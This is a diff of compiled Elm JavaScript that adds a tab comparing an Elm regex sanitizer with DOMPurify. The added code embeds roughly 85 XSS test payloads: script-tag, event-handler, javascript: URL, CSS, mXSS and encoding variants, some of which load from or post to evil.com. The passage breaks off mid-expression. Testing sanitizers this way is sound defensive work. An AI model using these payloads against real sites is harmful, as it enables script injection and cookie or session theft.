@@ -5265,30 +5265,329 @@ var $elm$core$Task$perform = F2(
 	});
 var $elm$browser$Browser$element = _Browser_element;
 var $author$project$Main$DemoTab = {$: 'DemoTab'};
-var $author$project$Main$initialModel = {activeTab: $author$project$Main$DemoTab, passthroughText: 'trusted internal value', plainText: 'Hello <script>alert(\'XSS\')</script> World', richText: 'This is <b>bold</b> and <script>alert(\'XSS\')</script>', url: 'javascript:alert(\'XSS\')'};
+var $author$project$Main$initialModel = {activeTab: $author$project$Main$DemoTab, comparisonPending: false, comparisonResults: _List_Nil, passthroughText: 'trusted internal value', plainText: 'Hello <script>alert(\'XSS\')</script> World', richText: 'This is <b>bold</b> and <script>alert(\'XSS\')</script>', url: 'javascript:alert(\'XSS\')'};
 var $elm$core$Platform$Cmd$batch = _Platform_batch;
 var $elm$core$Platform$Cmd$none = $elm$core$Platform$Cmd$batch(_List_Nil);
-var $elm$core$Platform$Sub$batch = _Platform_batch;
-var $elm$core$Platform$Sub$none = $elm$core$Platform$Sub$batch(_List_Nil);
+var $author$project$Main$GotComparisonResults = function (a) {
+	return {$: 'GotComparisonResults', a: a};
+};
+var $elm$json$Json$Decode$andThen = _Json_andThen;
+var $elm$json$Json$Decode$field = _Json_decodeField;
+var $elm$json$Json$Decode$list = _Json_decodeList;
+var $elm$json$Json$Decode$string = _Json_decodeString;
+var $author$project$Port$Middleware$receiveComparison = _Platform_incomingPort(
+	'receiveComparison',
+	$elm$json$Json$Decode$list(
+		A2(
+			$elm$json$Json$Decode$andThen,
+			function (textOnly) {
+				return A2(
+					$elm$json$Json$Decode$andThen,
+					function (safeHtml) {
+						return A2(
+							$elm$json$Json$Decode$andThen,
+							function (id) {
+								return $elm$json$Json$Decode$succeed(
+									{id: id, safeHtml: safeHtml, textOnly: textOnly});
+							},
+							A2($elm$json$Json$Decode$field, 'id', $elm$json$Json$Decode$string));
+					},
+					A2($elm$json$Json$Decode$field, 'safeHtml', $elm$json$Json$Decode$string));
+			},
+			A2($elm$json$Json$Decode$field, 'textOnly', $elm$json$Json$Decode$string))));
 var $author$project$Main$subscriptions = function (_v0) {
-	return $elm$core$Platform$Sub$none;
+	return $author$project$Port$Middleware$receiveComparison($author$project$Main$GotComparisonResults);
 };
 var $author$project$Port$Middleware$AllowSafeHtml = {$: 'AllowSafeHtml'};
 var $author$project$Port$Middleware$AllowTextOnly = {$: 'AllowTextOnly'};
 var $author$project$Port$Middleware$AllowUrl = {$: 'AllowUrl'};
+var $author$project$Main$ComparisonTab = {$: 'ComparisonTab'};
 var $author$project$Port$Middleware$Passthrough = {$: 'Passthrough'};
-var $author$project$Port$Middleware$policyToString = function (policy) {
-	switch (policy.$) {
-		case 'AllowTextOnly':
-			return 'text-only';
-		case 'AllowSafeHtml':
-			return 'safe-html';
-		case 'AllowUrl':
-			return 'url';
-		default:
-			return 'passthrough';
-	}
+var $author$project$Tests$cssVectorPayloads = _List_fromArray(
+	[
+		{category: 'CSS Vectors', id: 'c1', input: '<style>body{background:url(javascript:alert(1))}</style>'},
+		{category: 'CSS Vectors', id: 'c2', input: '<div style=\"background:url(javascript:alert(1))\">x</div>'},
+		{category: 'CSS Vectors', id: 'c3', input: '<style>*{x:expression(alert(1))}</style>'},
+		{category: 'CSS Vectors', id: 'c4', input: '<style>@import \'https://evil.com/evil.css\'</style>'},
+		{category: 'CSS Vectors', id: 'c5', input: '<div style=\"width:expression(alert(1))\">'}
+	]);
+var $author$project$Tests$dangerousTagPayloads = _List_fromArray(
+	[
+		{category: 'Dangerous Tags', id: 'd1', input: '<iframe src=\"https://evil.com\"></iframe>'},
+		{category: 'Dangerous Tags', id: 'd2', input: '<object data=\"https://evil.com/payload.swf\"></object>'},
+		{category: 'Dangerous Tags', id: 'd3', input: '<embed src=\"https://evil.com/plugin.swf\">'},
+		{category: 'Dangerous Tags', id: 'd4', input: '<base href=\"https://evil.com/\">'},
+		{category: 'Dangerous Tags', id: 'd5', input: '<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">'},
+		{category: 'Dangerous Tags', id: 'd6', input: '<link rel=\"stylesheet\" href=\"https://evil.com/evil.css\">'},
+		{category: 'Dangerous Tags', id: 'd7', input: '<form action=\"https://evil.com/steal\" method=\"post\">'},
+		{category: 'Dangerous Tags', id: 'd8', input: '<IFRAME src=\"https://evil.com\">'},
+		{category: 'Dangerous Tags', id: 'd9', input: '<frame src=\"https://evil.com\">'},
+		{category: 'Dangerous Tags', id: 'd10', input: '<frameset><frame src=\"https://evil.com\"></frameset>'}
+	]);
+var $author$project$Tests$encodingPayloads = _List_fromArray(
+	[
+		{category: 'Encoding Tricks', id: 'enc1', input: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'},
+		{category: 'Encoding Tricks', id: 'enc2', input: '&lt;script&gt;alert(1)&lt;/script&gt;'},
+		{category: 'Encoding Tricks', id: 'enc3', input: '<IMG SRC=x ONERROR=alert(1)>'},
+		{category: 'Encoding Tricks', id: 'enc4', input: '<a href=\"java&#9;script:alert(1)\">click</a>'},
+		{category: 'Encoding Tricks', id: 'enc5', input: '<a href=\"java&#10;script:alert(1)\">click</a>'},
+		{category: 'Encoding Tricks', id: 'enc6', input: '<a href=\"java&#13;script:alert(1)\">click</a>'},
+		{category: 'Encoding Tricks', id: 'enc7', input: '<a href=\"&#0000106;avascript:alert(1)\">click</a>'},
+		{category: 'Encoding Tricks', id: 'enc8', input: '<img src=\"x\" onerror=\"javascript:alert(1)\">'},
+		{category: 'Encoding Tricks', id: 'enc9', input: '<a href=\"\u0000javascript:alert(1)\">click</a>'},
+		{category: 'Encoding Tricks', id: 'enc10', input: '<iframe src=\"\u0000javascript:alert(1)\">'}
+	]);
+var $author$project$Tests$eventHandlerPayloads = _List_fromArray(
+	[
+		{category: 'Event Handlers', id: 'e1', input: '<img src=x onerror=alert(1)>'},
+		{category: 'Event Handlers', id: 'e2', input: '<img src=x onerror=\"alert(1)\">'},
+		{category: 'Event Handlers', id: 'e3', input: '<body onload=alert(1)>'},
+		{category: 'Event Handlers', id: 'e4', input: '<input onfocus=alert(1) autofocus>'},
+		{category: 'Event Handlers', id: 'e5', input: '<select onchange=alert(1)><option>a</option></select>'},
+		{category: 'Event Handlers', id: 'e6', input: '<details ontoggle=alert(1) open>x</details>'},
+		{category: 'Event Handlers', id: 'e7', input: '<video><source onerror=alert(1)></video>'},
+		{category: 'Event Handlers', id: 'e8', input: '<audio src=x onerror=alert(1)>'},
+		{category: 'Event Handlers', id: 'e9', input: '<div onmouseover=alert(1)>hover</div>'},
+		{category: 'Event Handlers', id: 'e10', input: '<a onclick=alert(1)>click</a>'},
+		{category: 'Event Handlers', id: 'e11', input: '<img src=x ONERROR=alert(1)>'},
+		{category: 'Event Handlers', id: 'e12', input: '<div onclick =alert(1)>click</div>'},
+		{category: 'Event Handlers', id: 'e13', input: '<p onmouseenter=alert(1)>text</p>'},
+		{category: 'Event Handlers', id: 'e14', input: '<textarea onblur=alert(1) autofocus></textarea>'},
+		{category: 'Event Handlers', id: 'e15', input: '<svg onload=alert(1)>test</svg>'}
+	]);
+var $author$project$Tests$jsUrlPayloads = _List_fromArray(
+	[
+		{category: 'JavaScript URLs', id: 'j1', input: '<a href=\"javascript:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j2', input: '<a href=\"JAVASCRIPT:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j3', input: '<a href=\"JaVaScRiPt:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j4', input: '<a href=\"&#106;avascript:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j5', input: '<a href=\"&#x6A;avascript:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j6', input: '<a href=\" javascript:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j7', input: '<img src=\"javascript:alert(1)\">'},
+		{category: 'JavaScript URLs', id: 'j8', input: '<form action=\"javascript:alert(1)\">'},
+		{category: 'JavaScript URLs', id: 'j9', input: '<a href=\"vbscript:msgbox(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j10', input: '<a href=\"data:text/html,<script>alert(1)</script>\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j11', input: '<iframe src=\"javascript:alert(1)\">'},
+		{category: 'JavaScript URLs', id: 'j12', input: '<a href=\"java\tscript:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j13', input: '<a href=\"java\nscript:alert(1)\">click</a>'},
+		{category: 'JavaScript URLs', id: 'j14', input: '<object data=\"javascript:alert(1)\">'},
+		{category: 'JavaScript URLs', id: 'j15', input: '<a href=\"javascript\u0000:alert(1)\">click</a>'}
+	]);
+var $author$project$Tests$mxssPayloads = _List_fromArray(
+	[
+		{category: 'mXSS / HTML5', id: 'm1', input: '<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">'},
+		{category: 'mXSS / HTML5', id: 'm2', input: '<!-- --!><img src=x onerror=alert(1)>'},
+		{category: 'mXSS / HTML5', id: 'm3', input: '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>'},
+		{category: 'mXSS / HTML5', id: 'm4', input: '<xmp><script>alert(1)</script></xmp>'},
+		{category: 'mXSS / HTML5', id: 'm5', input: '<plaintext><img src=x onerror=alert(1)>'},
+		{category: 'mXSS / HTML5', id: 'm6', input: '<p id=\"</p><img src=x onerror=alert(1)>\">test</p>'},
+		{category: 'mXSS / HTML5', id: 'm7', input: '<style><!--</style><img src=x onerror=alert(1)>-->'},
+		{category: 'mXSS / HTML5', id: 'm8', input: '<table><td><a href=\"javascript:alert(1)\">click</a></td></table>'},
+		{category: 'mXSS / HTML5', id: 'm9', input: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'},
+		{category: 'mXSS / HTML5', id: 'm10', input: '<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">'}
+	]);
+var $author$project$Tests$safePayloads = _List_fromArray(
+	[
+		{category: 'Safe Inputs', id: 'safe1', input: '<b>bold text</b>'},
+		{category: 'Safe Inputs', id: 'safe2', input: '<p>Hello <em>world</em>!</p>'},
+		{category: 'Safe Inputs', id: 'safe3', input: '<span class=\"highlight\">text</span>'},
+		{category: 'Safe Inputs', id: 'safe4', input: 'This is plain text with no HTML.'},
+		{category: 'Safe Inputs', id: 'safe5', input: '<a href=\"https://example.com\">Link</a>'}
+	]);
+var $author$project$Tests$scriptTagPayloads = _List_fromArray(
+	[
+		{category: 'Script Tags', id: 's1', input: '<script>alert(1)</script>'},
+		{category: 'Script Tags', id: 's2', input: '<SCRIPT>alert(1)</SCRIPT>'},
+		{category: 'Script Tags', id: 's3', input: '<Script>alert(1)</Script>'},
+		{category: 'Script Tags', id: 's4', input: '</script><script>alert(1)</script>'},
+		{category: 'Script Tags', id: 's5', input: '<script type=\"text/javascript\">alert(1)</script>'},
+		{category: 'Script Tags', id: 's6', input: '<script\n>alert(1)</script>'},
+		{category: 'Script Tags', id: 's7', input: '<script\n  type=\"text/javascript\">\nalert(1)\n</script>'},
+		{category: 'Script Tags', id: 's8', input: '<scr<script>ipt>alert(1)</scr</script>ipt>'},
+		{category: 'Script Tags', id: 's9', input: '<!--<script>alert(1)</script>-->'},
+		{category: 'Script Tags', id: 's10', input: '<script>alert(String.fromCharCode(88,83,83))</script>'},
+		{category: 'Script Tags', id: 's11', input: '<script src=\"//evil.com/xss.js\"></script>'},
+		{category: 'Script Tags', id: 's12', input: '<script>document.cookie</script>'},
+		{category: 'Script Tags', id: 's13', input: '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>'},
+		{category: 'Script Tags', id: 's14', input: '<<script>alert(1)<</script>'},
+		{category: 'Script Tags', id: 's15', input: '<scr\u0000ipt>alert(1)</scr\u0000ipt>'}
+	]);
+var $author$project$Tests$comparisonPayloads = _Utils_ap(
+	$author$project$Tests$scriptTagPayloads,
+	_Utils_ap(
+		$author$project$Tests$eventHandlerPayloads,
+		_Utils_ap(
+			$author$project$Tests$jsUrlPayloads,
+			_Utils_ap(
+				$author$project$Tests$dangerousTagPayloads,
+				_Utils_ap(
+					$author$project$Tests$cssVectorPayloads,
+					_Utils_ap(
+						$author$project$Tests$mxssPayloads,
+						_Utils_ap($author$project$Tests$encodingPayloads, $author$project$Tests$safePayloads)))))));
+var $elm$core$Dict$RBEmpty_elm_builtin = {$: 'RBEmpty_elm_builtin'};
+var $elm$core$Dict$empty = $elm$core$Dict$RBEmpty_elm_builtin;
+var $elm$core$Dict$Black = {$: 'Black'};
+var $elm$core$Dict$RBNode_elm_builtin = F5(
+	function (a, b, c, d, e) {
+		return {$: 'RBNode_elm_builtin', a: a, b: b, c: c, d: d, e: e};
+	});
+var $elm$core$Dict$Red = {$: 'Red'};
+var $elm$core$Dict$balance = F5(
+	function (color, key, value, left, right) {
+		if ((right.$ === 'RBNode_elm_builtin') && (right.a.$ === 'Red')) {
+			var _v1 = right.a;
+			var rK = right.b;
+			var rV = right.c;
+			var rLeft = right.d;
+			var rRight = right.e;
+			if ((left.$ === 'RBNode_elm_builtin') && (left.a.$ === 'Red')) {
+				var _v3 = left.a;
+				var lK = left.b;
+				var lV = left.c;
+				var lLeft = left.d;
+				var lRight = left.e;
+				return A5(
+					$elm$core$Dict$RBNode_elm_builtin,
+					$elm$core$Dict$Red,
+					key,
+					value,
+					A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Black, lK, lV, lLeft, lRight),
+					A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Black, rK, rV, rLeft, rRight));
+			} else {
+				return A5(
+					$elm$core$Dict$RBNode_elm_builtin,
+					color,
+					rK,
+					rV,
+					A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Red, key, value, left, rLeft),
+					rRight);
+			}
+		} else {
+			if ((((left.$ === 'RBNode_elm_builtin') && (left.a.$ === 'Red')) && (left.d.$ === 'RBNode_elm_builtin')) && (left.d.a.$ === 'Red')) {
+				var _v5 = left.a;
+				var lK = left.b;
+				var lV = left.c;
+				var _v6 = left.d;
+				var _v7 = _v6.a;
+				var llK = _v6.b;
+				var llV = _v6.c;
+				var llLeft = _v6.d;
+				var llRight = _v6.e;
+				var lRight = left.e;
+				return A5(
+					$elm$core$Dict$RBNode_elm_builtin,
+					$elm$core$Dict$Red,
+					lK,
+					lV,
+					A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Black, llK, llV, llLeft, llRight),
+					A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Black, key, value, lRight, right));
+			} else {
+				return A5($elm$core$Dict$RBNode_elm_builtin, color, key, value, left, right);
+			}
+		}
+	});
+var $elm$core$Basics$compare = _Utils_compare;
+var $elm$core$Dict$insertHelp = F3(
+	function (key, value, dict) {
+		if (dict.$ === 'RBEmpty_elm_builtin') {
+			return A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Red, key, value, $elm$core$Dict$RBEmpty_elm_builtin, $elm$core$Dict$RBEmpty_elm_builtin);
+		} else {
+			var nColor = dict.a;
+			var nKey = dict.b;
+			var nValue = dict.c;
+			var nLeft = dict.d;
+			var nRight = dict.e;
+			var _v1 = A2($elm$core$Basics$compare, key, nKey);
+			switch (_v1.$) {
+				case 'LT':
+					return A5(
+						$elm$core$Dict$balance,
+						nColor,
+						nKey,
+						nValue,
+						A3($elm$core$Dict$insertHelp, key, value, nLeft),
+						nRight);
+				case 'EQ':
+					return A5($elm$core$Dict$RBNode_elm_builtin, nColor, nKey, value, nLeft, nRight);
+				default:
+					return A5(
+						$elm$core$Dict$balance,
+						nColor,
+						nKey,
+						nValue,
+						nLeft,
+						A3($elm$core$Dict$insertHelp, key, value, nRight));
+			}
+		}
+	});
+var $elm$core$Dict$insert = F3(
+	function (key, value, dict) {
+		var _v0 = A3($elm$core$Dict$insertHelp, key, value, dict);
+		if ((_v0.$ === 'RBNode_elm_builtin') && (_v0.a.$ === 'Red')) {
+			var _v1 = _v0.a;
+			var k = _v0.b;
+			var v = _v0.c;
+			var l = _v0.d;
+			var r = _v0.e;
+			return A5($elm$core$Dict$RBNode_elm_builtin, $elm$core$Dict$Black, k, v, l, r);
+		} else {
+			var x = _v0;
+			return x;
+		}
+	});
+var $elm$core$Dict$fromList = function (assocs) {
+	return A3(
+		$elm$core$List$foldl,
+		F2(
+			function (_v0, dict) {
+				var key = _v0.a;
+				var value = _v0.b;
+				return A3($elm$core$Dict$insert, key, value, dict);
+			}),
+		$elm$core$Dict$empty,
+		assocs);
 };
+var $elm$core$Dict$get = F2(
+	function (targetKey, dict) {
+		get:
+		while (true) {
+			if (dict.$ === 'RBEmpty_elm_builtin') {
+				return $elm$core$Maybe$Nothing;
+			} else {
+				var key = dict.b;
+				var value = dict.c;
+				var left = dict.d;
+				var right = dict.e;
+				var _v1 = A2($elm$core$Basics$compare, targetKey, key);
+				switch (_v1.$) {
+					case 'LT':
+						var $temp$targetKey = targetKey,
+							$temp$dict = left;
+						targetKey = $temp$targetKey;
+						dict = $temp$dict;
+						continue get;
+					case 'EQ':
+						return $elm$core$Maybe$Just(value);
+					default:
+						var $temp$targetKey = targetKey,
+							$temp$dict = right;
+						targetKey = $temp$targetKey;
+						dict = $temp$dict;
+						continue get;
+				}
+			}
+		}
+	});
+var $elm$json$Json$Encode$list = F2(
+	function (func, entries) {
+		return _Json_wrap(
+			A3(
+				$elm$core$List$foldl,
+				_Json_addEntry(func),
+				_Json_emptyArray(_Utils_Tuple0),
+				entries));
+	});
 var $elm$json$Json$Encode$object = function (pairs) {
 	return _Json_wrap(
 		A3(
@@ -5303,28 +5602,21 @@ var $elm$json$Json$Encode$object = function (pairs) {
 			pairs));
 };
 var $elm$json$Json$Encode$string = _Json_wrap;
-var $author$project$Port$Middleware$sendToJS = _Platform_outgoingPort(
-	'sendToJS',
-	function ($) {
-		return $elm$json$Json$Encode$object(
-			_List_fromArray(
-				[
-					_Utils_Tuple2(
-					'data',
-					$elm$core$Basics$identity($.data)),
-					_Utils_Tuple2(
-					'policy',
-					$elm$json$Json$Encode$string($.policy))
-				]));
-	});
-var $author$project$Port$Middleware$send = F2(
-	function (policy, payload) {
-		return $author$project$Port$Middleware$sendToJS(
-			{
-				data: payload,
-				policy: $author$project$Port$Middleware$policyToString(policy)
-			});
-	});
+var $author$project$Port$Middleware$requestComparison = _Platform_outgoingPort(
+	'requestComparison',
+	$elm$json$Json$Encode$list(
+		function ($) {
+			return $elm$json$Json$Encode$object(
+				_List_fromArray(
+					[
+						_Utils_Tuple2(
+						'id',
+						$elm$json$Json$Encode$string($.id)),
+						_Utils_Tuple2(
+						'input',
+						$elm$json$Json$Encode$string($.input))
+					]));
+		}));
 var $elm$regex$Regex$Match = F4(
 	function (match, index, number, submatches) {
 		return {index: index, match: match, number: number, submatches: submatches};
@@ -5495,6 +5787,40 @@ var $author$project$Port$Middleware$sanitize = F2(
 				return rawString;
 		}
 	});
+var $author$project$Port$Middleware$policyToString = function (policy) {
+	switch (policy.$) {
+		case 'AllowTextOnly':
+			return 'text-only';
+		case 'AllowSafeHtml':
+			return 'safe-html';
+		case 'AllowUrl':
+			return 'url';
+		default:
+			return 'passthrough';
+	}
+};
+var $author$project$Port$Middleware$sendToJS = _Platform_outgoingPort(
+	'sendToJS',
+	function ($) {
+		return $elm$json$Json$Encode$object(
+			_List_fromArray(
+				[
+					_Utils_Tuple2(
+					'data',
+					$elm$core$Basics$identity($.data)),
+					_Utils_Tuple2(
+					'policy',
+					$elm$json$Json$Encode$string($.policy))
+				]));
+	});
+var $author$project$Port$Middleware$send = F2(
+	function (policy, payload) {
+		return $author$project$Port$Middleware$sendToJS(
+			{
+				data: payload,
+				policy: $author$project$Port$Middleware$policyToString(policy)
+			});
+	});
 var $author$project$Port$Middleware$sendString = F2(
 	function (policy, rawString) {
 		var safeString = A2($author$project$Port$Middleware$sanitize, policy, rawString);
@@ -5535,13 +5861,6 @@ var $author$project$Main$update = F2(
 						model,
 						{passthroughText: str}),
 					$elm$core$Platform$Cmd$none);
-			case 'SetTab':
-				var tab = msg.a;
-				return _Utils_Tuple2(
-					_Utils_update(
-						model,
-						{activeTab: tab}),
-					$elm$core$Platform$Cmd$none);
 			case 'SendPlainText':
 				return _Utils_Tuple2(
 					model,
@@ -5554,13 +5873,78 @@ var $author$project$Main$update = F2(
 				return _Utils_Tuple2(
 					model,
 					A2($author$project$Port$Middleware$sendString, $author$project$Port$Middleware$AllowUrl, model.url));
-			default:
+			case 'SendPassThrough':
 				return _Utils_Tuple2(
 					model,
 					A2(
 						$author$project$Port$Middleware$send,
 						$author$project$Port$Middleware$Passthrough,
 						$elm$json$Json$Encode$string(model.passthroughText)));
+			case 'SetTab':
+				if (msg.a.$ === 'ComparisonTab') {
+					var _v1 = msg.a;
+					var payloads = $author$project$Tests$comparisonPayloads;
+					var portPayloads = A2(
+						$elm$core$List$map,
+						function (p) {
+							return {id: p.id, input: p.input};
+						},
+						payloads);
+					var elmResults = A2(
+						$elm$core$List$map,
+						function (p) {
+							return {
+								category: p.category,
+								dpSafeHtml: '',
+								dpTextOnly: '',
+								elmSafeHtml: A2($author$project$Port$Middleware$sanitize, $author$project$Port$Middleware$AllowSafeHtml, p.input),
+								elmTextOnly: A2($author$project$Port$Middleware$sanitize, $author$project$Port$Middleware$AllowTextOnly, p.input),
+								id: p.id,
+								input: p.input
+							};
+						},
+						payloads);
+					return _Utils_Tuple2(
+						_Utils_update(
+							model,
+							{activeTab: $author$project$Main$ComparisonTab, comparisonPending: true, comparisonResults: elmResults}),
+						$author$project$Port$Middleware$requestComparison(portPayloads));
+				} else {
+					var tab = msg.a;
+					return _Utils_Tuple2(
+						_Utils_update(
+							model,
+							{activeTab: tab}),
+						$elm$core$Platform$Cmd$none);
+				}
+			default:
+				var dpResults = msg.a;
+				var dpDict = $elm$core$Dict$fromList(
+					A2(
+						$elm$core$List$map,
+						function (r) {
+							return _Utils_Tuple2(r.id, r);
+						},
+						dpResults));
+				var updated = A2(
+					$elm$core$List$map,
+					function (r) {
+						var _v2 = A2($elm$core$Dict$get, r.id, dpDict);
+						if (_v2.$ === 'Just') {
+							var dp = _v2.a;
+							return _Utils_update(
+								r,
+								{dpSafeHtml: dp.safeHtml, dpTextOnly: dp.textOnly});
+						} else {
+							return r;
+						}
+					},
+					model.comparisonResults);
+				return _Utils_Tuple2(
+					_Utils_update(
+						model,
+						{comparisonPending: false, comparisonResults: updated}),
+					$elm$core$Platform$Cmd$none);
 		}
 	});
 var $author$project$Main$TestsTab = {$: 'TestsTab'};
@@ -6021,6 +6405,899 @@ var $author$project$Main$tabButton = F3(
 					$elm$html$Html$text(label)
 				]));
 	});
+var $author$project$Main$viewComparisonNote = A2(
+	$elm$html$Html$div,
+	_List_fromArray(
+		[
+			A2($elm$html$Html$Attributes$style, 'background', '#f0f9ff'),
+			A2($elm$html$Html$Attributes$style, 'border', '1px solid #bae6fd'),
+			A2($elm$html$Html$Attributes$style, 'border-radius', '8px'),
+			A2($elm$html$Html$Attributes$style, 'padding', '12px 16px'),
+			A2($elm$html$Html$Attributes$style, 'margin-bottom', '24px'),
+			A2($elm$html$Html$Attributes$style, 'font-size', '0.85rem'),
+			A2($elm$html$Html$Attributes$style, 'color', '#0c4a6e'),
+			A2($elm$html$Html$Attributes$style, 'line-height', '1.5')
+		]),
+	_List_fromArray(
+		[
+			$elm$html$Html$text('85 curated XSS payloads from OWASP, PortSwigger, and mXSS research — run through both sanitizers. '),
+			$elm$html$Html$text('\"Match\" means the sanitized output strings are identical. '),
+			$elm$html$Html$text('Divergences in AllowSafeHtml vs DOMPurify reveal coverage gaps between the regex-based Elm approach and DOMPurify\'s DOM-parser-based sanitization.')
+		]));
+var $elm$html$Html$span = _VirtualDom_node('span');
+var $author$project$Main$badge = F2(
+	function (label, color) {
+		return A2(
+			$elm$html$Html$span,
+			_List_fromArray(
+				[
+					A2($elm$html$Html$Attributes$style, 'background', color),
+					A2($elm$html$Html$Attributes$style, 'color', 'white'),
+					A2($elm$html$Html$Attributes$style, 'padding', '2px 10px'),
+					A2($elm$html$Html$Attributes$style, 'border-radius', '99px'),
+					A2($elm$html$Html$Attributes$style, 'font-size', '0.8rem'),
+					A2($elm$html$Html$Attributes$style, 'font-weight', '600')
+				]),
+			_List_fromArray(
+				[
+					$elm$html$Html$text(label)
+				]));
+	});
+var $elm$core$Basics$neq = _Utils_notEqual;
+var $author$project$Main$computeMatrix = function (rows) {
+	return A3(
+		$elm$core$List$foldl,
+		F2(
+			function (r, acc) {
+				var outputsMatch = _Utils_eq(r.elmOutput, r.dpOutput);
+				var elmBlocked = !_Utils_eq(r.elmOutput, r.input);
+				return (elmBlocked && outputsMatch) ? _Utils_update(
+					acc,
+					{tp: acc.tp + 1}) : ((elmBlocked && (!outputsMatch)) ? _Utils_update(
+					acc,
+					{fp: acc.fp + 1}) : (((!elmBlocked) && (!outputsMatch)) ? _Utils_update(
+					acc,
+					{fn: acc.fn + 1}) : _Utils_update(
+					acc,
+					{tn: acc.tn + 1})));
+			}),
+		{fn: 0, fp: 0, tn: 0, tp: 0},
+		rows);
+};
+var $elm$html$Html$h3 = _VirtualDom_node('h3');
+var $elm$html$Html$table = _VirtualDom_node('table');
+var $elm$html$Html$tbody = _VirtualDom_node('tbody');
+var $elm$html$Html$th = _VirtualDom_node('th');
+var $author$project$Main$thStyle = F2(
+	function (w, align) {
+		return _List_fromArray(
+			[
+				A2($elm$html$Html$Attributes$style, 'padding', '7px 10px'),
+				A2($elm$html$Html$Attributes$style, 'text-align', align),
+				A2($elm$html$Html$Attributes$style, 'color', '#444'),
+				A2($elm$html$Html$Attributes$style, 'font-weight', '600'),
+				A2($elm$html$Html$Attributes$style, 'border-bottom', '2px solid #e0e0e0'),
+				A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+				A2($elm$html$Html$Attributes$style, 'min-width', w)
+			]);
+	});
+var $elm$html$Html$thead = _VirtualDom_node('thead');
+var $elm$html$Html$tr = _VirtualDom_node('tr');
+var $elm$html$Html$td = _VirtualDom_node('td');
+var $author$project$Main$truncate = F2(
+	function (maxLen, s) {
+		return (_Utils_cmp(
+			$elm$core$String$length(s),
+			maxLen) > 0) ? (A2($elm$core$String$left, maxLen, s) + '…') : s;
+	});
+var $author$project$Main$viewComparisonRow = function (row) {
+	var matches = _Utils_eq(row.elmOutput, row.dpOutput);
+	var rowBg = matches ? 'white' : '#fffbeb';
+	var borderBt = '1px solid #f0f0f0';
+	return A2(
+		$elm$html$Html$tr,
+		_List_fromArray(
+			[
+				A2($elm$html$Html$Attributes$style, 'background', rowBg),
+				A2($elm$html$Html$Attributes$style, 'border-bottom', borderBt)
+			]),
+		_List_fromArray(
+			[
+				A2(
+				$elm$html$Html$td,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'padding', '5px 10px'),
+						A2($elm$html$Html$Attributes$style, 'color', '#666'),
+						A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+						A2($elm$html$Html$Attributes$style, 'font-size', '0.74rem')
+					]),
+				_List_fromArray(
+					[
+						$elm$html$Html$text(row.category)
+					])),
+				A2(
+				$elm$html$Html$td,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'padding', '5px 10px'),
+						A2($elm$html$Html$Attributes$style, 'font-family', 'monospace'),
+						A2($elm$html$Html$Attributes$style, 'max-width', '220px')
+					]),
+				_List_fromArray(
+					[
+						A2(
+						$elm$html$Html$span,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'display', 'block'),
+								A2($elm$html$Html$Attributes$style, 'overflow', 'hidden'),
+								A2($elm$html$Html$Attributes$style, 'text-overflow', 'ellipsis'),
+								A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+								A2($elm$html$Html$Attributes$style, 'color', '#555')
+							]),
+						_List_fromArray(
+							[
+								$elm$html$Html$text(
+								A2($author$project$Main$truncate, 45, row.input))
+							]))
+					])),
+				A2(
+				$elm$html$Html$td,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'padding', '5px 10px'),
+						A2($elm$html$Html$Attributes$style, 'font-family', 'monospace'),
+						A2($elm$html$Html$Attributes$style, 'max-width', '220px')
+					]),
+				_List_fromArray(
+					[
+						A2(
+						$elm$html$Html$span,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'display', 'block'),
+								A2($elm$html$Html$Attributes$style, 'overflow', 'hidden'),
+								A2($elm$html$Html$Attributes$style, 'text-overflow', 'ellipsis'),
+								A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+								A2($elm$html$Html$Attributes$style, 'color', '#333')
+							]),
+						_List_fromArray(
+							[
+								$elm$html$Html$text(
+								$elm$core$String$isEmpty(row.elmOutput) ? '(empty)' : A2($author$project$Main$truncate, 45, row.elmOutput))
+							]))
+					])),
+				A2(
+				$elm$html$Html$td,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'padding', '5px 10px'),
+						A2($elm$html$Html$Attributes$style, 'font-family', 'monospace'),
+						A2($elm$html$Html$Attributes$style, 'max-width', '220px')
+					]),
+				_List_fromArray(
+					[
+						A2(
+						$elm$html$Html$span,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'display', 'block'),
+								A2($elm$html$Html$Attributes$style, 'overflow', 'hidden'),
+								A2($elm$html$Html$Attributes$style, 'text-overflow', 'ellipsis'),
+								A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+								A2($elm$html$Html$Attributes$style, 'color', '#333')
+							]),
+						_List_fromArray(
+							[
+								$elm$html$Html$text(
